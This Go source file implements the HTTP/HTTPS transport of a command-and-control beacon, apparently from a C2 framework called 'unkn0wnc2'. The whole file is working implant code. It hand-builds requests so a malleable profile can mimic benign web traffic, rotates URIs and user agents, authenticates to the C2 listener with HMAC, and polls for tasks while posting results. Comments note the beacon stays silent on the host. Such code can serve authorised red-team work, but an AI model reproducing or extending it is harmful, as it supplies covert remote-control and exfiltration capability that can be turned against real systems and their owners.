// Package main implements the beacon's HTTP/HTTPS transport.
//
// This does not use net/http. Two properties the profile promises cannot be
// honoured through it:
//
//   - Header set and order. net/http stores headers in a map and serialises them
//     in its own order, and it cannot be stopped from adding its own
//     (Accept-Encoding, User-Agent, Connection).
//   - Host header control independent of the connection target.
//
// Both are wire-visible properties that a malleable profile exists to control,
// so the request is written directly to a TCP or TLS connection. The dialect is
// deliberately plain HTTP/1.1 with "Connection: close", which keeps response
// framing trivial: Content-Length, chunked, or read-to-EOF are all we must
// handle, and there is no keep-alive state to get wrong.
package main

import (
	"bufio"
	"crypto/hmac"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/url"
	"strconv"
	"strings"
	"time"
)

const (
	// defaultHTTPTimeoutSecs bounds a single request.
	defaultHTTPTimeoutSecs = 15
	// defaultHTTPMaxBodyBytes caps a response we will read into memory.
	defaultHTTPMaxBodyBytes = 1048576
	// httpAuthModeNone is the only mode needing no signature.
	httpAuthModeNone = "none"
	// httpAuthModeHMAC is the default: an HMAC over method, path, timestamp and
	// body, proving the beacon holds the C2 key.
	httpAuthModeHMAC = "hmac-sha256"
	// httpAuthModeShared is a static token derived from the C2 key.
	httpAuthModeShared = "shared-header"
	// maxHTTPStatusLine is a sanity bound while parsing a response.
	maxHTTPStatusLine = 1024
)

// httpTransport sends protocol messages to one malleable listener.
type httpTransport struct {
	listener HTTPListener
	aesKey   []byte
	timeout  time.Duration
	maxBody  int64
	// userAgent is fixed per transport so a beacon is consistent across its own
	// requests rather than changing identity every cycle.
	userAgent string
}

// newHTTPTransport prepares a transport for one listener.
func newHTTPTransport(listener HTTPListener, aesKey []byte) (*httpTransport, error) {
	if listener.Host == "" {
		return nil, fmt.Errorf("listener %q has no host", listener.Name)
	}
	if strings.ContainsAny(listener.Host, "\r\n") {
		return nil, fmt.Errorf("listener %q host contains a line break", listener.Name)
	}
	if strings.ContainsAny(listener.HostHeader, "\r\n") {
		return nil, fmt.Errorf("listener %q host_header contains a line break", listener.Name)
	}
	authMode := listener.Auth.Mode
	if authMode == "" {
		authMode = httpAuthModeHMAC
		listener.Auth.Mode = authMode
	}
	if authMode != httpAuthModeNone {
		if listener.Auth.Header == "" {
			listener.Auth.Header = "X-Sig"
		}
		if listener.Auth.SigEncoding == "" {
			listener.Auth.SigEncoding = "hex"
		}
		if err := validateClientHeaderName(listener.Auth.Header); err != nil {
			return nil, fmt.Errorf("listener %q auth header: %w", listener.Name, err)
		}
	}
	if err := validateLegacyHeaders(listener.Headers); err != nil {
		return nil, fmt.Errorf("listener %q headers: %w", listener.Name, err)
	}
	if err := validateAuthoritativeHeaders(listener); err != nil {
		return nil, fmt.Errorf("listener %q request_headers: %w", listener.Name, err)
	}
	// An https listener with no SPKI pin is accepted but unverified: the profile
	// asked for unpinned TLS. The server warns about this at its own startup, so
	// the operator sees it there; the beacon stays silent, as it does about
	// everything else.

	timeout := time.Duration(listener.TimeoutSecs) * time.Second
	if listener.TimeoutSecs <= 0 {
		timeout = defaultHTTPTimeoutSecs * time.Second
	}

	maxBody := listener.MaxBodyBytes
	if maxBody <= 0 {
		maxBody = defaultHTTPMaxBodyBytes
	}

	transport := &httpTransport{
		listener: listener,
		aesKey:   aesKey,
		timeout:  timeout,
		maxBody:  maxBody,
	}

	if len(listener.UserAgents) > 0 {
		transport.userAgent = listener.UserAgents[rand.Intn(len(listener.UserAgents))]
	}

	return transport, nil
}

func validateClientHeaderName(name string) error {
	if strings.TrimSpace(name) == "" {
		return fmt.Errorf("is empty")
	}
	const separators = "()<>@,;:\\\"/[]?={} \t"
	for _, char := range name {
		if char < 33 || char > 126 || strings.ContainsRune(separators, char) {
			return fmt.Errorf("name %q contains an illegal character", name)
		}
	}
	return nil
}

func validateLegacyHeaders(headers []HTTPHeader) error {
	for i, header := range headers {
		if err := validateClientHeaderName(header.Name); err != nil {
			return fmt.Errorf("entry %d %w", i, err)
		}
		if strings.ContainsAny(header.Value, "\r\n") {
			return fmt.Errorf("entry %d value contains a line break", i)
		}
		if strings.Contains(header.Value, "{{") {
			return fmt.Errorf("entry %d uses a template in legacy headers; use request_headers", i)
		}
		for _, operation := range header.Operations {
			switch strings.ToLower(operation) {
			case "register", "task", "result", "ack":
			default:
				return fmt.Errorf("entry %d has unknown operation %q", i, operation)
			}
		}
	}
	return nil
}

func validateAuthoritativeHeaders(listener HTTPListener) error {
	if len(listener.RequestHeaders) == 0 {
		return nil
	}
	allowedTemplates := map[string]bool{
		"host": true, "user_agent": true, "content_type": true, "content_length": true,
		"auth": true, "method": true, "path": true, "request_target": true, "operation": true,
	}
	for i, header := range listener.RequestHeaders {
		if err := validateClientHeaderName(header.Name); err != nil {
			return fmt.Errorf("entry %d %w", i, err)
		}
		if strings.ContainsAny(header.Value, "\r\n") {
			return fmt.Errorf("entry %d value contains a line break", i)
		}
		for _, operation := range header.Operations {
			switch strings.ToLower(operation) {
			case "register", "task", "result", "ack":
			default:
				return fmt.Errorf("entry %d has unknown operation %q", i, operation)
			}
		}
		rest := header.Value
		for {
			start := strings.Index(rest, "{{")
			if start < 0 {
				break
			}
			end := strings.Index(rest[start+2:], "}}")
			if end < 0 {
				return fmt.Errorf("entry %d has an unterminated template", i)
			}
			name := rest[start+2 : start+2+end]
			if !allowedTemplates[name] {
				return fmt.Errorf("entry %d uses unknown template %q", i, "{{"+name+"}}")
			}
			rest = rest[start+2+end+2:]
		}
	}

	has := func(operation, name, token string) bool {
		for _, header := range listener.RequestHeaders {
			if headerApplies(header, operation) && strings.EqualFold(header.Name, name) &&
				(token == "" || strings.Contains(header.Value, token)) {
				return true
			}
		}
		return false
	}
	for _, operation := range []string{"register", "task", "result", "ack"} {
		if !has(operation, "Host", "") {
			return fmt.Errorf("must provide Host for %s", operation)
		}
		authMode := listener.Auth.Mode
		if authMode == "" {
			authMode = httpAuthModeHMAC
		}
		if authMode != httpAuthModeNone && !has(operation, listener.Auth.Header, "{{auth}}") {
			return fmt.Errorf("must provide %s with {{auth}} for %s", listener.Auth.Header, operation)
		}
		method := strings.ToUpper(listener.Methods[operation])
		if method == "" {
			if operation == "task" || operation == "ack" {
				method = "GET"
			} else {
				method = "POST"
			}
		}
		if method != "GET" && method != "HEAD" && !has(operation, "Content-Length", "{{content_length}}") {
			return fmt.Errorf("must provide Content-Length with {{content_length}} for %s", operation)
		}
	}
	for _, header := range listener.RequestHeaders {
		if strings.Contains(header.Value, "{{user_agent}}") && len(listener.UserAgents) == 0 {
			return fmt.Errorf("uses {{user_agent}} but user_agents is empty")
		}
	}
	return nil
}

// pickPath chooses one of the configured paths for an operation. Multiple paths
// exist so an operator can rotate URIs, so the choice is random per request.
func (t *httpTransport) pickPath(operation string) (string, error) {
	paths := t.listener.URIs[operation]
	if len(paths) == 0 {
		return "", fmt.Errorf("no URI configured for operation %q", operation)
	}
	return paths[rand.Intn(len(paths))], nil
}

// methodFor returns the configured HTTP method for an operation.
func (t *httpTransport) methodFor(operation string) string {
	if method, ok := t.listener.Methods[operation]; ok && method != "" {
		return strings.ToUpper(method)
	}
	// Defaults match the server profile defaults.
	switch operation {
	case "task", "ack":
		return "GET"
	default:
		return "POST"
	}
}

// send performs one request/response round trip for a protocol message.
//
// The message travels in the body for POST-style operations and in the query
// parameter named by the request codec's field for GET-style operations, which
// is the shape the listener expects (see extractMessage server-side).
func (t *httpTransport) send(operation, message string) (string, error) {
	path, err := t.pickPath(operation)
	if err != nil {
		return "", err
	}
	method := t.methodFor(operation)

	var body []byte
	if method != "GET" && method != "HEAD" {
		body, err = encodeHTTPBody(t.listener.RequestBody, message, t.aesKey)
		if err != nil {
			return "", err
		}
	} else {
		encoded, err := t.encodeAsQueryValue(message)
		if err != nil {
			return "", err
		}
		separator := "?"
		if strings.Contains(path, "?") {
			separator = "&"
		}
		path = path + separator + t.listener.RequestBody.Field + "=" + encoded
	}

	raw, status, err := t.roundTrip(operation, method, path, body)
	if err != nil {
		return "", err
	}
	if status < 200 || status >= 300 {
		return "", fmt.Errorf("listener %q answered %d", t.listener.Name, status)
	}
	// An empty body is the listener's "nothing to say" response.
	if len(strings.TrimSpace(string(raw))) == 0 {
		return "", nil
	}

	return decodeHTTPBody(t.listener.ResponseBody, raw, t.aesKey)
}

// encodeAsQueryValue encodes a message for a GET request's query parameter.
func (t *httpTransport) encodeAsQueryValue(message string) (string, error) {
	c := t.listener.RequestBody
	if c.Encoding == codecRaw || c.Encoding == "" {
		return url.QueryEscape(message), nil
	}

	// Reuse the codec by encoding a single-field document and lifting the value
	// out, so the encoding logic exists in exactly one place.
	encoded, err := encodeHTTPBody(c, message, t.aesKey)
	if err != nil {
		return "", err
	}
	var envelope map[string]string
	if err := json.Unmarshal(encoded, &envelope); err != nil {
		return "", fmt.Errorf("failed to read encoded query value: %w", err)
	}
	value, ok := envelope[c.Field]
	if !ok {
		return "", fmt.Errorf("encoded query value has no %q field", c.Field)
	}
	return url.QueryEscape(value), nil
}

// roundTrip dials, writes the request, and reads the response.
func (t *httpTransport) roundTrip(operation, method, path string, body []byte) ([]byte, int, error) {
	useTLS := t.listener.Scheme != "http"

	var conn net.Conn
	var err error

	dialer := net.Dialer{Timeout: t.timeout}
	if useTLS {
		tlsConfig, tlsErr := t.tlsConfig()
		if tlsErr != nil {
			return nil, 0, tlsErr
		}
		conn, err = tls.DialWithDialer(&dialer, "tcp", t.listener.Host, tlsConfig)
	} else {
		conn, err = dialer.Dial("tcp", t.listener.Host)
	}
	if err != nil {
		return nil, 0, fmt.Errorf("failed to reach %s: %w", t.listener.Host, err)
	}
	defer conn.Close()

	_ = conn.SetDeadline(time.Now().Add(t.timeout))

	if _, err := conn.Write(t.buildRequest(operation, method, path, body)); err != nil {
		return nil, 0, fmt.Errorf("failed to send request: %w", err)
	}

	return readHTTPResponse(conn, t.maxBody)
}

// tlsConfig pins the listener certificate's SPKI.
//
// Normal verification is skipped because the listener uses a self-signed
// certificate; the pin is what provides assurance. Verifying the pin here rather
// than accepting the connection and checking later means a wrong certificate
// aborts the handshake.
func (t *httpTransport) tlsConfig() (*tls.Config, error) {
	expected := t.listener.SPKISHA256

	return &tls.Config{
		ServerName:         hostOnly(t.listener.Host),
		InsecureSkipVerify: true, // replaced by the pin check below
		MinVersion:         tls.VersionTLS12,
		VerifyConnection: func(state tls.ConnectionState) error {
			if len(state.PeerCertificates) == 0 {
				return fmt.Errorf("listener presented no certificate")
			}
			if expected == "" {
				// No pin configured: the profile asked for unpinned TLS.
				return nil
			}
			cert := state.PeerCertificates[0]
			sum := sha256.Sum256(cert.RawSubjectPublicKeyInfo)
			actual := base64.StdEncoding.EncodeToString(sum[:])
			if actual != expected {
				return fmt.Errorf("listener certificate SPKI %s does not match the pinned %s", actual, expected)
			}
			return nil
		},
	}, nil
}

// buildRequest serialises either the authoritative request_headers template or
// the legacy automatic shape. In authoritative mode the profile controls every
// header byte and its position; no defaults are silently appended.
func (t *httpTransport) buildRequest(operation, method, path string, body []byte) []byte {
	var builder strings.Builder
	builder.WriteString(method + " " + path + " HTTP/1.1\r\n")

	if len(t.listener.RequestHeaders) > 0 {
		auth := t.authHeaderValue(method, path, body)
		for _, header := range t.listener.RequestHeaders {
			if !headerApplies(header, operation) {
				continue
			}
			value := t.expandHeaderValue(header.Value, operation, method, path, body, auth)
			// In auth:none mode any line whose value depends on {{auth}} is
			// absent, even when the token had a prefix such as "Bearer ".
			if strings.Contains(header.Value, "{{auth}}") && auth == "" {
				continue
			}
			builder.WriteString(header.Name + ": " + value + "\r\n")
		}
		builder.WriteString("\r\n")
		request := []byte(builder.String())
		return append(request, body...)
	}

	hostHeader := t.listener.HostHeader
	if hostHeader == "" {
		hostHeader = t.listener.Host
	}
	builder.WriteString("Host: " + hostHeader + "\r\n")

	for _, header := range t.listener.Headers {
		if header.Name == "" || !headerApplies(header, operation) {
			continue
		}
		if strings.EqualFold(header.Name, "Host") || strings.EqualFold(header.Name, "Content-Length") {
			// Legacy profiles retain the original safety behaviour. Use
			// request_headers when those fields must be explicitly positioned.
			continue
		}
		builder.WriteString(header.Name + ": " + header.Value + "\r\n")
	}

	if t.userAgent != "" {
		builder.WriteString("User-Agent: " + t.userAgent + "\r\n")
	}
	if len(body) > 0 {
		builder.WriteString("Content-Type: application/json\r\n")
		builder.WriteString("Content-Length: " + strconv.Itoa(len(body)) + "\r\n")
	}
	if signature := t.authHeaderValue(method, path, body); signature != "" {
		builder.WriteString(t.listener.Auth.Header + ": " + signature + "\r\n")
	}
	builder.WriteString("Connection: close\r\n\r\n")

	request := []byte(builder.String())
	return append(request, body...)
}

func headerApplies(header HTTPHeader, operation string) bool {
	if len(header.Operations) == 0 {
		return true
	}
	for _, candidate := range header.Operations {
		if strings.EqualFold(candidate, operation) {
			return true
		}
	}
	return false
}

func (t *httpTransport) expandHeaderValue(value, operation, method, path string, body []byte, auth string) string {
	host := t.listener.HostHeader
	if host == "" {
		host = t.listener.Host
	}
	contentType := ""
	if len(body) > 0 {
		contentType = "application/json"
	}
	replacer := strings.NewReplacer(
		"{{host}}", host,
		"{{user_agent}}", t.userAgent,
		"{{content_type}}", contentType,
		"{{content_length}}", strconv.Itoa(len(body)),
		"{{auth}}", auth,
		"{{method}}", strings.ToUpper(method),
		"{{path}}", pathOnly(path),
		"{{request_target}}", path,
		"{{operation}}", operation,
	)
	return replacer.Replace(value)
}

// authHeaderValue computes the configured signature for a request.
func (t *httpTransport) authHeaderValue(method, path string, body []byte) string {
	mode := t.listener.Auth.Mode
	switch mode {
	case "", httpAuthModeHMAC:
		mode = httpAuthModeHMAC
	case httpAuthModeNone:
		return ""
	case httpAuthModeShared:
		mac := hmac.New(sha256.New, t.hmacKey())
		mac.Write([]byte("shared-header"))
		return hex.EncodeToString(mac.Sum(nil))
	}

	timestamp := strconv.FormatInt(time.Now().Unix(), 10)
	mac := hmac.New(sha256.New, t.hmacKey())
	mac.Write([]byte(strings.ToUpper(method) + "\n" + pathOnly(path) + "\n" + timestamp + "\n" + string(body)))

	signature := hex.EncodeToString(mac.Sum(nil))
	if t.listener.Auth.SigEncoding == "base64" {
		signature = base64.StdEncoding.EncodeToString(mac.Sum(nil))
	}
	return timestamp + "." + signature
}

// hmacKey derives the signing key, matching the server's derivation.
func (t *httpTransport) hmacKey() []byte {
	mac := hmac.New(sha256.New, t.aesKey)
	mac.Write([]byte("unkn0wnc2-http-v1"))
	return mac.Sum(nil)
}

// readHTTPResponse parses a status line, headers and body from a connection.
func readHTTPResponse(conn net.Conn, maxBody int64) ([]byte, int, error) {
	reader := bufio.NewReader(conn)

	statusLine, err := readLine(reader, maxHTTPStatusLine)
	if err != nil {
		return nil, 0, fmt.Errorf("failed to read status line: %w", err)
	}

	fields := strings.SplitN(statusLine, " ", 3)
	if len(fields) < 2 {
		return nil, 0, fmt.Errorf("malformed status line %q", statusLine)
	}
	status, err := strconv.Atoi(fields[1])
	if err != nil {
		return nil, 0, fmt.Errorf("malformed status code in %q", statusLine)
	}

	// Headers. Only content-length and transfer-encoding affect framing.
	var contentLength int64 = -1
	chunked := false

	for {
		line, err := readLine(reader, maxHTTPStatusLine)
		if err != nil {
			return nil, status, fmt.Errorf("failed to read response headers: %w", err)
		}
		if line == "" {
			break
		}
		name, value, found := strings.Cut(line, ":")
		if !found {
			continue
		}
		switch strings.ToLower(strings.TrimSpace(name)) {
		case "content-length":
			if parsed, convErr := strconv.ParseInt(strings.TrimSpace(value), 10, 64); convErr == nil {
				contentLength = parsed
			}
		case "transfer-encoding":
			if strings.Contains(strings.ToLower(value), "chunked") {
				chunked = true
			}
		}
	}

	if maxBody <= 0 {
		maxBody = defaultHTTPMaxBodyBytes
	}

	switch {
	case chunked:
		body, err := readChunkedBody(reader, maxBody)
		return body, status, err

	case contentLength >= 0:
		if contentLength > maxBody {
			return nil, status, fmt.Errorf("response body of %d bytes exceeds the %d byte limit", contentLength, maxBody)
		}
		body := make([]byte, contentLength)
		if _, err := io.ReadFull(reader, body); err != nil {
			return nil, status, fmt.Errorf("failed to read response body: %w", err)
		}
		return body, status, nil

	default:
		// Connection: close makes read-to-EOF valid.
		body, err := io.ReadAll(io.LimitReader(reader, maxBody+1))
		if err != nil {
			return nil, status, fmt.Errorf("failed to read response body: %w", err)
		}
		if int64(len(body)) > maxBody {
			return nil, status, fmt.Errorf("response body exceeds the %d byte limit", maxBody)
		}
		return body, status, nil
	}
}

// readChunkedBody decodes a chunked response.
func readChunkedBody(reader *bufio.Reader, maxBody int64) ([]byte, error) {
	var out []byte

	for {
		sizeLine, err := readLine(reader, maxHTTPStatusLine)
		if err != nil {
			return nil, fmt.Errorf("failed to read chunk size: %w", err)
		}
		// A chunk size may carry extensions after ";".
		if index := strings.Index(sizeLine, ";"); index >= 0 {
			sizeLine = sizeLine[:index]
		}
		size, err := strconv.ParseInt(strings.TrimSpace(sizeLine), 16, 64)
		if err != nil || size < 0 {
			return nil, fmt.Errorf("malformed chunk size %q", sizeLine)
		}
		if size == 0 {
			// Consume the trailer section.
			for {
				line, err := readLine(reader, maxHTTPStatusLine)
				if err != nil {
					return nil, err
				}
				if line == "" {
					break
				}
			}
			return out, nil
		}
		if int64(len(out))+size > maxBody {
			return nil, fmt.Errorf("chunked response exceeds the %d byte limit", maxBody)
		}

		chunk := make([]byte, size)
		if _, err := io.ReadFull(reader, chunk); err != nil {
			return nil, fmt.Errorf("failed to read chunk body: %w", err)
		}
		out = append(out, chunk...)

		// Trailing CRLF after each chunk.
		if _, err := readLine(reader, maxHTTPStatusLine); err != nil {
			return nil, err
		}
	}
}

// readLine reads a CRLF-terminated line without its terminator.
func readLine(reader *bufio.Reader, limit int) (string, error) {
	line, err := reader.ReadString('\n')
	if err != nil {
		return "", err
	}
	if len(line) > limit {
		return "", fmt.Errorf("line exceeds %d bytes", limit)
	}
	return strings.TrimRight(line, "\r\n"), nil
}

// hostOnly strips a port from a host:port pair, for TLS SNI.
func hostOnly(host string) string {
	if parsed, _, err := net.SplitHostPort(host); err == nil {
		return parsed
	}
	return host
}

// pathOnly strips a query string, matching what the listener signs.
func pathOnly(path string) string {
	if index := strings.Index(path, "?"); index >= 0 {
		return path[:index]
	}
	return path
}
